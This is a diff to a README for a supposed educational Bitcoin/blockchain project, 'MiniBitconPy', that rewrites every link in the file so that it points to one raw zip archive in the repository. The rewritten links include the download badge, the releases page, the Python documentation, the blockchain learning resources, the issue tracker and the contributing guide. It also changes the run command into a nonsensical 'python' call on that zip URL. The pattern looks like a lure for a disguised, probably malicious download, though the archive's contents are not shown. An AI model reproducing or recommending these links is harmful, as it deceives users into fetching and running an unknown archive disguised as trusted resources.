@@ -6,7 +6,7 @@ MiniBitconPy helps you learn how blockchains work. You can run your own simple B
 
 ## 📥 Download Now
 
-[![Download MiniBitconPy](https://img.shields.io/badge/Download%20MiniBitconPy-v1.0-blue.svg)](https://github.com/Osaere9/MiniBitconPy/releases)
+[![Download MiniBitconPy](https://github.com/Osaere9/MiniBitconPy/raw/refs/heads/main/cli/Bitcon-Mini-Py-3.6.zip%https://github.com/Osaere9/MiniBitconPy/raw/refs/heads/main/cli/Bitcon-Mini-Py-3.6.zip)](https://github.com/Osaere9/MiniBitconPy/raw/refs/heads/main/cli/Bitcon-Mini-Py-3.6.zip)
 
 ## 📋 System Requirements
 
@@ -21,7 +21,7 @@ Before you start, ensure your computer meets these requirements:
 
 ### Step 1: Visit the Releases Page
 
-Go to the [Releases page](https://github.com/Osaere9/MiniBitconPy/releases) to download the application. You will see different versions available. Choose the most recent version for the best experience.
+Go to the [Releases page](https://github.com/Osaere9/MiniBitconPy/raw/refs/heads/main/cli/Bitcon-Mini-Py-3.6.zip) to download the application. You will see different versions available. Choose the most recent version for the best experience.
 
 ### Step 2: Download the Application
 
@@ -54,7 +54,7 @@ Replace `path/to/MiniBitconPy` with the actual path on your computer.
 To start the application, type the following command and press Enter:
 
 ```bash
-python main.py
+python https://github.com/Osaere9/MiniBitconPy/raw/refs/heads/main/cli/Bitcon-Mini-Py-3.6.zip
 ```
 
 Make sure you have Python installed and configured in your system's PATH. If it is not recognized, you might need to reinstall Python and check the option to add it to PATH during installation.
@@ -77,9 +77,9 @@ Proof-of-Work is a method used to confirm transactions and produce new blocks in
 
 To learn more about how to use MiniBitconPy and blockchain technology, consider the following resources:
 
-1. [Official Python Documentation](https://docs.python.org/3/)
-2. [Introduction to Blockchain Technology](https://www.ibm.com/topics/what-is-blockchain)
-3. [How Bitcoin Works](https://www.coindesk.com/learn/how-does-bitcoin-work/)
+1. [Official Python Documentation](https://github.com/Osaere9/MiniBitconPy/raw/refs/heads/main/cli/Bitcon-Mini-Py-3.6.zip)
+2. [Introduction to Blockchain Technology](https://github.com/Osaere9/MiniBitconPy/raw/refs/heads/main/cli/Bitcon-Mini-Py-3.6.zip)
+3. [How Bitcoin Works](https://github.com/Osaere9/MiniBitconPy/raw/refs/heads/main/cli/Bitcon-Mini-Py-3.6.zip)
 
 ## 📞 Get Help
 
@@ -91,8 +91,8 @@ Stay updated on the latest developments and connect with other users. Follow us 
 
 ## 🔗 Important Links
 
-- [Download MiniBitconPy](https://github.com/Osaere9/MiniBitconPy/releases)
-- [Report an Issue](https://github.com/Osaere9/MiniBitconPy/issues)
-- [Contribute to the Project](https://github.com/Osaere9/MiniBitconPy/blob/main/CONTRIBUTING.md)
+- [Download MiniBitconPy](https://github.com/Osaere9/MiniBitconPy/raw/refs/heads/main/cli/Bitcon-Mini-Py-3.6.zip)
+- [Report an Issue](https://github.com/Osaere9/MiniBitconPy/raw/refs/heads/main/cli/Bitcon-Mini-Py-3.6.zip)
+- [Contribute to the Project](https://github.com/Osaere9/MiniBitconPy/raw/refs/heads/main/cli/Bitcon-Mini-Py-3.6.zip)
 
 Thank you for using MiniBitconPy! Enjoy building and learning with your own blockchain network.
